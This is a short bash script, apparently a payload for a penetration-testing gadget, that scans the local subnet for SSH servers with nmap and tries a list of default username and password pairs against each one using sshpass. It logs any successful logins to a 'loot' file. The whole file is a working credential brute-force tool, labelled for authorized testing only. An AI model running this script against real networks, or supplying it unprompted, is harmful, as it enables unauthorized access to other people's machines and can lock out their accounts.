#!/bin/bash
# SSH Brute Force - Credential testing
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY
# CAN CAUSE ACCOUNT LOCKOUTS

LED ATTACK

echo "[!] SSH Brute Force"
echo "[*] Testing common credentials..."

OUTPUT="/root/loot/ssh-results-$(date +%Y%m%d-%H%M%S).txt"
mkdir -p /root/loot

# Get subnet
SUBNET=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)[\d.]+/\d+' | head -1)

# Find SSH servers
echo "[*] Finding SSH servers..."
SSH_HOSTS=$(nmap -p 22 --open $SUBNET | grep "Nmap scan" | grep -oP '\d+\.\d+\.\d+\.\d+')

echo "=== SSH BRUTE FORCE ===" > $OUTPUT
echo "Date: $(date)" >> $OUTPUT
echo "" >> $OUTPUT

# Common credentials
CREDS="root:root root:toor admin:admin admin:password pi:raspberry"

for host in $SSH_HOSTS; do
    echo "[*] Testing $host" | tee -a $OUTPUT
    
    for cred in $CREDS; do
        USER=$(echo $cred | cut -d: -f1)
        PASS=$(echo $cred | cut -d: -f2)
        
        echo "  Trying $USER:$PASS"
        
        sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $USER@$host "echo SUCCESS" 2>/dev/null
        
        if [ $? -eq 0 ]; then
            echo "[+] SUCCESS: $host - $USER:$PASS" | tee -a $OUTPUT
        fi
        
        sleep 3  # Rate limiting
    done
done

LED FINISH
echo "[+] Complete: $OUTPUT"
